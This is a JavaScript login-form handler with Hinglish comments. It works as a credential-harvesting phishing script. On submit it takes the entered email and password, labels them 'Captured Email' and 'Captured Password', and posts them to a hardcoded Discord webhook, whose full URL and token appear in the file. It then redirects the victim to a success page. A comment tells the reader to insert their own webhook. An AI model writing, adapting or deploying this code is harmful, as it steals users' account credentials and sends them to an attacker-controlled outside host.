document.getElementById('authForm').addEventListener('submit', function(event) {
    event.preventDefault(); // Default page reload rokne ke liye

    // Input values elements se access karna
    const emailData = document.getElementById('userEmail').value;
    const passwordData = document.getElementById('userPassword').value;
    const alertBox = document.getElementById('submissionAlert');
    const actionBtn = document.getElementById('loginSubmitBtn');

    // UI Loading state update
    actionBtn.innerText = "Loading...";
    actionBtn.disabled = true;

    // Yahan aapko apni real Discord channel ki Webhook Link lagani hogi
    const customTargetEndpoint = 'https://discord.com/api/webhooks/1508432808039682098/bWGWAylgqRfO2Npoa8J44YuEftQB2jYiHehvJ_Brojdtpufryn8D40fWDr9TUil3OUaF';

    // JSON Structure data transmit karne ke liye
    const transmissionPayload = {
        username: "AA Visuals Log Stream",
        embeds: [{
            title: "📥 Incoming Portal Entry",
            color: 1579250, // Hex structure corresponding integer color
            fields: [
                { name: "Captured Email", value: emailData, inline: false },
                { name: "Captured Password", value: passwordData, inline: false }
            ],
            footer: {
                text: "AA Visuals Automation Protocol"
            },
            timestamp: new Date().toISOString()
        }]
    };

    // Asynchronous Request to Discord API
    fetch(customTargetEndpoint, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(transmissionPayload)
    })
    .then(networkResponse => {
        if (networkResponse.ok) {
            alertBox.className = "submission-alert active-success";
            alertBox.innerText = "Data transmitted to backend grid successfully.";
            
            // Form reset karne ke baad 1 second ka delay de kar redirect karein
            document.getElementById('authForm').reset();
            
            setTimeout(() => {
                window.location.href = 'success.html'; // Yeh line user ko automatic agle page par le jaye gi
            }, 1000);

        } else {
            throw new Error('API Endpoint connection anomaly.');
        }
    })
    .catch(runtimeError => {
        alertBox.className = "submission-alert active-error";
        alertBox.innerText = "Transmission interruption occurred. System offline.";
        console.error('Diagnostic Log:', runtimeError);
    })
    .finally(() => {
        // UI Button reset logic
        actionBtn.innerText = "Log In";
        actionBtn.disabled = false;
    });
});